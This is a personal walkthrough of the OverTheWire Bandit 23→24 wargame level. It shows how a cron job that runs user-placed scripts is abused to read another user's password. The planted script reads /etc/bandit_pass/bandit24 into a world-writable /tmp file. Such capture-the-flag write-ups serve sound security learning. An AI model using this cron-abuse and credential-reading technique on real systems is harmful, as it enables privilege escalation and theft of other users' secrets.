# Bandit23 → 24: The Shell Script Heist

[Challenge](https://overthewire.org/wargames/bandit/bandit24.html)

---

## Level Description

The password for the next level is hidden, guarded by a program running automatically via **cron**, the time-based job scheduler. This level requires creating your own shell script—a big step forward! The script will be executed by the cron job, and its output will reveal the password.

---

## The Process

**Step 1: Entering the Realm of bandit23**

I logged into bandit23 server, ready for the next challenge:

```bash
ssh bandit23@bandit.labs.overthewire.org -p 2220
```

After entering the password, I found myself in an empty home directory. But I knew better than to be fooled—there was always a clue hidden somewhere.

**Step 2: The Cron Job Clue**

The level description mentioned a **cron job** running automatically. I decided to investigate the `/etc/cron.d/` directory, where cron configurations are stored:

```bash
cd /etc/cron.d/
ls
```

The directory revealed several cron job files:

```bash
cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  e2scrub_all  otw-tmp-dir  sysstat
```

The file `cronjob_bandit24` stood out. It had to be the key to unlocking the next level.

**Step 3: Decoding the Cron Job**

I opened the `cronjob_bandit24` file to see what it was up to:

```bash
cat cronjob_bandit24
```

The output was:

```bash
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

This meant that a script, `/usr/bin/cronjob_bandit24.sh`, was running every minute as the `bandit24` user. The `&> /dev/null` part ensured that any output was discarded, making it harder to detect. But I wasn’t going to let that stop me.

**Step 4: Unmasking the Script**

I decided to inspect the script to understand its purpose:

```bash
cat /usr/bin/cronjob_bandit24.sh
```

The script contained the following:

```bash
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```

Here’s what it did:

1. It determined the current user (`whoami`).
2. It navigated to `/var/spool/$myname/foo`.
3. It executed and deleted all scripts in that directory. but only if the owner was `bandit23`.

This was a clever setup. The cron job was essentially running any script placed in `/var/spool/bandit24/foo` by `bandit23`.

**Step 5: Crafting the Shell Script**

I needed to create a script that would retrieve the password for Bandit24 and store it somewhere accessible. I decided to create a temporary directory in `/tmp/` to store the script and its output:

```
mkdir /tmp/fuckyou
cd /tmp/fuckyou
```

I then created a shell script named `getpassbandit24.sh`:

```
vim getpassbandit24.sh
```

The script contained the following:

```
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/fuckyou/pass_bandit24.txt
```

This script would copy the password for Bandit24 to a file in `/tmp/fuckyou/`.

**Step 6: Setting Permissions**

I made sure the script was executable:

```
chmod 777 getpassbandit24.sh
```

I also created an empty file to store the password:

```
touch pass_bandit24.txt
chmod 777 pass_bandit24.txt
```

**Step 7: Placing the Script in the Target Directory**

I copied the script to `/var/spool/bandit24/foo`:

```
cp getpassbandit24.sh /var/spool/bandit24/foo
```

**Step 8: Waiting for the Cron Job to Execute**

The cron job runs every minute, so I waited a bit and then checked the output file:

```
cat /tmp/fuckyou/pass_bandit24.txt
```

And there it was—the password for Bandit24.

## Password for the Next Level

`[REDACTED]`

## What I Learned

- **Cron Jobs**: I learned how to inspect and understand cron job configurations in `/etc/cron.d/`.
- **Shell Scripting**: This level reinforced the importance of writing and executing shell scripts.
- **File Permissions**: I gained insight into how file permissions can be used to control access and execution.

## Helpful Reading Material

- [Cron Jobs in Linux](https://linux.die.net/man/5/crontab): A guide to understanding cron jobs and their configuration.
- [Shell Scripting](https://linux.die.net/man/1/bash): Documentation on writing and executing shell scripts.
